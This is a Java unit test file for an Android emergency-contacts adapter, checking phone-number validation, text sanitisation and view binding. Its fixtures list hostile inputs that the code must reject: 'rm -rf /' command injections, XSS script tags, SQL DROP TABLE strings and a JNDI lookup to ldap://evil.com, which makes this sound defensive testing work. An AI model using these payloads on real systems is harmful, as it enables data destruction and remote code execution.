package com.ly2xxx.sos;

import static org.junit.Assert.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;

import androidx.test.core.app.ApplicationProvider;

import com.ly2xxx.sos.model.EmergencyContact;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import org.robolectric.RobolectricTestRunner;
import org.robolectric.annotation.Config;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

@RunWith(RobolectricTestRunner.class)
@Config(sdk = 28)
public class EmergencyContactAdapterTest {

    @Mock
    private View mockView;
    
    @Mock
    private Context mockContext;
    
    @Mock
    private PackageManager mockPackageManager;
    
    @Mock
    private TextView mockTextView;

    private EmergencyContactAdapter adapter;
    private List<EmergencyContactsActivity.CountryEmergencyContact> testContacts;
    private Context context;

    @Before
    public void setUp() {
        MockitoAnnotations.openMocks(this);
        context = ApplicationProvider.getApplicationContext();
        
        // Create test data
        testContacts = createTestContacts();
        adapter = new EmergencyContactAdapter(testContacts);
    }

    private List<EmergencyContactsActivity.CountryEmergencyContact> createTestContacts() {
        List<EmergencyContactsActivity.CountryEmergencyContact> contacts = new ArrayList<>();
        
        EmergencyContact usContact = new EmergencyContact("911", "911", "911", "911");
        contacts.add(new EmergencyContactsActivity.CountryEmergencyContact("United States", usContact));
        
        EmergencyContact ukContact = new EmergencyContact("999", "999", "999", "112");
        contacts.add(new EmergencyContactsActivity.CountryEmergencyContact("United Kingdom", ukContact));
        
        EmergencyContact invalidContact = new EmergencyContact("", "N/A", "invalid123", null);
        contacts.add(new EmergencyContactsActivity.CountryEmergencyContact("Invalid Country", invalidContact));
        
        return contacts;
    }

    @Test
    public void testGetItemCount() {
        assertEquals(3, adapter.getItemCount());
        
        // Test with null list
        EmergencyContactAdapter nullAdapter = new EmergencyContactAdapter(null);
        assertEquals(0, nullAdapter.getItemCount());
        
        // Test with empty list
        EmergencyContactAdapter emptyAdapter = new EmergencyContactAdapter(new ArrayList<>());
        assertEquals(0, emptyAdapter.getItemCount());
    }

    @Test
    public void testIsValidEmergencyNumber() throws Exception {
        Method method = EmergencyContactAdapter.class.getDeclaredMethod("isValidEmergencyNumber", String.class);
        method.setAccessible(true);
        
        // Valid numbers
        assertTrue((Boolean) method.invoke(adapter, "911"));
        assertTrue((Boolean) method.invoke(adapter, "999"));
        assertTrue((Boolean) method.invoke(adapter, "112"));
        assertTrue((Boolean) method.invoke(adapter, "+1-555-123-4567"));
        assertTrue((Boolean) method.invoke(adapter, "+49 30 12345"));
        assertTrue((Boolean) method.invoke(adapter, "(555) 123-4567"));
        
        // Invalid numbers
        assertFalse((Boolean) method.invoke(adapter, null));
        assertFalse((Boolean) method.invoke(adapter, ""));
        assertFalse((Boolean) method.invoke(adapter, "N/A"));
        assertFalse((Boolean) method.invoke(adapter, "12")); // Too short
        assertFalse((Boolean) method.invoke(adapter, "123456789012345678901")); // Too long
        assertFalse((Boolean) method.invoke(adapter, "call911")); // Contains letters
        assertFalse((Boolean) method.invoke(adapter, "911<script>")); // Malicious input
        assertFalse((Boolean) method.invoke(adapter, "911; rm -rf /")); // Command injection
    }

    @Test
    public void testSanitizeDisplayText() throws Exception {
        Method method = EmergencyContactAdapter.class.getDeclaredMethod("sanitizeDisplayText", String.class);
        method.setAccessible(true);
        
        // Normal text
        assertEquals("United States", method.invoke(adapter, "United States"));
        assertEquals("911", method.invoke(adapter, "911"));
        
        // Null input
        assertEquals("", method.invoke(adapter, null));
        
        // Empty input
        assertEquals("", method.invoke(adapter, ""));
        
        // Text with control characters
        String textWithControls = "United\u0000States\u0001";
        String result = (String) method.invoke(adapter, textWithControls);
        assertEquals("UnitedStates", result);
        
        // Very long text
        StringBuilder longText = new StringBuilder();
        for (int i = 0; i < 150; i++) {
            longText.append("a");
        }
        result = (String) method.invoke(adapter, longText.toString());
        assertTrue(result.length() <= 103); // 100 + "..."
        assertTrue(result.endsWith("..."));
    }

    @Test
    public void testSanitizePhoneNumberForIntent() throws Exception {
        Method method = EmergencyContactAdapter.class.getDeclaredMethod("sanitizePhoneNumberForIntent", String.class);
        method.setAccessible(true);
        
        // Valid phone numbers
        assertEquals("911", method.invoke(adapter, "911"));
        assertEquals("+1-555-123-4567", method.invoke(adapter, "+1-555-123-4567"));
        assertEquals("(555) 123-4567", method.invoke(adapter, "(555) 123-4567"));
        
        // Invalid inputs
        assertNull(method.invoke(adapter, null));
        assertNull(method.invoke(adapter, ""));
        assertNull(method.invoke(adapter, "call911")); // Contains letters
        assertNull(method.invoke(adapter, "911<script>")); // Malicious input
        assertNull(method.invoke(adapter, "911; rm -rf /")); // Command injection
        assertNull(method.invoke(adapter, "12")); // Too short
        assertNull(method.invoke(adapter, "123456789012345678901")); // Too long
    }

    @Test
    public void testSecurityValidation_MaliciousPhoneNumbers() throws Exception {
        Method validationMethod = EmergencyContactAdapter.class.getDeclaredMethod("isValidEmergencyNumber", String.class);
        validationMethod.setAccessible(true);
        
        String[] maliciousInputs = {
                "911<script>alert('xss')</script>",
                "911'; DROP TABLE emergency_contacts; --",
                "javascript:alert('xss')",
                "tel:+1-555-EVIL",
                "sip:evil@attacker.com",
                "911\"; system('rm -rf /')",
                "911\n\r\t<malicious>",
                "${jndi:ldap://evil.com/a}",
                "911%3Cscript%3Ealert('xss')%3C/script%3E"
        };
        
        for (String maliciousInput : maliciousInputs) {
            boolean result = (Boolean) validationMethod.invoke(adapter, maliciousInput);
            assertFalse("Malicious phone number not rejected: " + maliciousInput, result);
        }
    }

    @Test
    public void testSecurityValidation_DisplayTextSanitization() throws Exception {
        Method sanitizeMethod = EmergencyContactAdapter.class.getDeclaredMethod("sanitizeDisplayText", String.class);
        sanitizeMethod.setAccessible(true);
        
        String[] maliciousInputs = {
                "Country<script>alert('xss')</script>",
                "Country\u0000\u0001\u0002", // Control characters
                "Country'; DROP TABLE countries; --",
                "Country\n\r\t<malicious>",
                "Country${jndi:ldap://evil.com/a}"
        };
        
        for (String maliciousInput : maliciousInputs) {
            String result = (String) sanitizeMethod.invoke(adapter, maliciousInput);
            assertNotNull("Sanitization should not return null", result);
            assertFalse("XSS not properly sanitized: " + maliciousInput, result.contains("<script>"));
            assertFalse("Control characters not removed: " + maliciousInput, result.contains("\u0000"));
            assertFalse("JNDI injection not sanitized: " + maliciousInput, result.contains("${jndi:"));
        }
    }

    @Test
    public void testViewHolderCreation() {
        // Create a mock view with the required child views
        View mockItemView = mock(View.class);
        TextView mockCountryName = mock(TextView.class);
        TextView mockPolice = mock(TextView.class);
        TextView mockAmbulance = mock(TextView.class);
        TextView mockFire = mock(TextView.class);
        TextView mockGeneral = mock(TextView.class);
        
        when(mockItemView.findViewById(R.id.tv_country_name)).thenReturn(mockCountryName);
        when(mockItemView.findViewById(R.id.tv_police_number)).thenReturn(mockPolice);
        when(mockItemView.findViewById(R.id.tv_ambulance_number)).thenReturn(mockAmbulance);
        when(mockItemView.findViewById(R.id.tv_fire_number)).thenReturn(mockFire);
        when(mockItemView.findViewById(R.id.tv_general_number)).thenReturn(mockGeneral);
        
        EmergencyContactAdapter.ViewHolder viewHolder = new EmergencyContactAdapter.ViewHolder(mockItemView);
        
        assertNotNull(viewHolder);
        assertEquals(mockCountryName, viewHolder.countryName);
        assertEquals(mockPolice, viewHolder.policeNumber);
        assertEquals(mockAmbulance, viewHolder.ambulanceNumber);
        assertEquals(mockFire, viewHolder.fireNumber);
        assertEquals(mockGeneral, viewHolder.generalNumber);
    }

    @Test
    public void testViewHolderCreation_MissingViews() {
        // Test ViewHolder creation when some views are missing
        View mockItemView = mock(View.class);
        
        // Only provide some views, others will be null
        when(mockItemView.findViewById(R.id.tv_country_name)).thenReturn(mock(TextView.class));
        when(mockItemView.findViewById(R.id.tv_police_number)).thenReturn(null);
        when(mockItemView.findViewById(R.id.tv_ambulance_number)).thenReturn(null);
        when(mockItemView.findViewById(R.id.tv_fire_number)).thenReturn(null);
        when(mockItemView.findViewById(R.id.tv_general_number)).thenReturn(null);
        
        // Should not throw exception even with missing views
        EmergencyContactAdapter.ViewHolder viewHolder = new EmergencyContactAdapter.ViewHolder(mockItemView);
        
        assertNotNull(viewHolder);
        assertNotNull(viewHolder.countryName);
        assertNull(viewHolder.policeNumber);
        assertNull(viewHolder.ambulanceNumber);
        assertNull(viewHolder.fireNumber);
        assertNull(viewHolder.generalNumber);
    }

    @Test
    public void testBindViewHolder_ValidData() throws Exception {
        // Create a real ViewHolder with mock views
        View mockItemView = mock(View.class);
        TextView mockCountryName = mock(TextView.class);
        TextView mockPolice = mock(TextView.class);
        TextView mockAmbulance = mock(TextView.class);
        TextView mockFire = mock(TextView.class);
        TextView mockGeneral = mock(TextView.class);
        
        when(mockItemView.findViewById(R.id.tv_country_name)).thenReturn(mockCountryName);
        when(mockItemView.findViewById(R.id.tv_police_number)).thenReturn(mockPolice);
        when(mockItemView.findViewById(R.id.tv_ambulance_number)).thenReturn(mockAmbulance);
        when(mockItemView.findViewById(R.id.tv_fire_number)).thenReturn(mockFire);
        when(mockItemView.findViewById(R.id.tv_general_number)).thenReturn(mockGeneral);
        
        EmergencyContactAdapter.ViewHolder viewHolder = new EmergencyContactAdapter.ViewHolder(mockItemView);
        
        // Test binding with valid data
        adapter.onBindViewHolder(viewHolder, 0);
        
        verify(mockCountryName).setText("United States");
        verify(mockPolice).setText("🚔 Police 911");
        verify(mockAmbulance).setText("🚑 Ambulance 911");
        verify(mockFire).setText("🚒 Fire 911");
        verify(mockGeneral).setText("🆘 Emergency 911");
    }

    @Test
    public void testBindViewHolder_InvalidPosition() {
        View mockItemView = mock(View.class);
        EmergencyContactAdapter.ViewHolder viewHolder = new EmergencyContactAdapter.ViewHolder(mockItemView);
        
        // Test with invalid positions - should not crash
        adapter.onBindViewHolder(viewHolder, -1);
        adapter.onBindViewHolder(viewHolder, 999);
        
        // No exceptions should be thrown
    }

    @Test
    public void testBindViewHolder_NullData() {
        // Test adapter with null data
        List<EmergencyContactsActivity.CountryEmergencyContact> nullList = new ArrayList<>();
        nullList.add(null); // Add null item
        
        EmergencyContactAdapter nullAdapter = new EmergencyContactAdapter(nullList);
        
        View mockItemView = mock(View.class);
        EmergencyContactAdapter.ViewHolder viewHolder = new EmergencyContactAdapter.ViewHolder(mockItemView);
        
        // Should not crash with null data
        nullAdapter.onBindViewHolder(viewHolder, 0);
    }

    @Test
    public void testMakeCall_SecurityValidation() throws Exception {
        Method makeCallMethod = EmergencyContactAdapter.class.getDeclaredMethod("makeCall", View.class, String.class, String.class);
        makeCallMethod.setAccessible(true);
        
        // Mock view and context
        when(mockView.getContext()).thenReturn(mockContext);
        when(mockContext.getPackageManager()).thenReturn(mockPackageManager);
        
        // Test with malicious phone numbers
        String[] maliciousNumbers = {
                "911<script>alert('xss')</script>",
                "911'; DROP TABLE contacts; --",
                "javascript:alert('xss')",
                "911\"; system('rm -rf /')"
        };
        
        for (String maliciousNumber : maliciousNumbers) {
            // Should not create intent for malicious numbers
            makeCallMethod.invoke(adapter, mockView, maliciousNumber, "Police");
            
            // Verify no startActivity was called
            verify(mockContext, never()).startActivity(any(Intent.class));
        }
    }

    @Test
    public void testEdgeCases_EmptyAndNullInputs() {
        // Test adapter with empty list
        EmergencyContactAdapter emptyAdapter = new EmergencyContactAdapter(new ArrayList<>());
        assertEquals(0, emptyAdapter.getItemCount());
        
        // Test adapter with null list
        EmergencyContactAdapter nullAdapter = new EmergencyContactAdapter(null);
        assertEquals(0, nullAdapter.getItemCount());
        
        // Test with list containing null emergency contact
        List<EmergencyContactsActivity.CountryEmergencyContact> listWithNull = new ArrayList<>();
        listWithNull.add(new EmergencyContactsActivity.CountryEmergencyContact("Test", null));
        
        EmergencyContactAdapter adapterWithNull = new EmergencyContactAdapter(listWithNull);
        assertEquals(1, adapterWithNull.getItemCount());
    }

    @Test
    public void testBoundaryConditions() throws Exception {
        Method validationMethod = EmergencyContactAdapter.class.getDeclaredMethod("isValidEmergencyNumber", String.class);
        validationMethod.setAccessible(true);
        
        // Test boundary lengths
        assertFalse((Boolean) validationMethod.invoke(adapter, "12")); // Length 2 (too short)
        assertTrue((Boolean) validationMethod.invoke(adapter, "123")); // Length 3 (minimum valid)
        
        // Create 15-digit number (maximum valid)
        String maxLength = "123456789012345";
        assertTrue((Boolean) validationMethod.invoke(adapter, maxLength));
        
        // Create 16-digit number (too long)
        String tooLong = "1234567890123456";
        assertFalse((Boolean) validationMethod.invoke(adapter, tooLong));
        
        // Test 20-digit number (way too long)
        String wayTooLong = "12345678901234567890";
        assertFalse((Boolean) validationMethod.invoke(adapter, wayTooLong));
    }
}
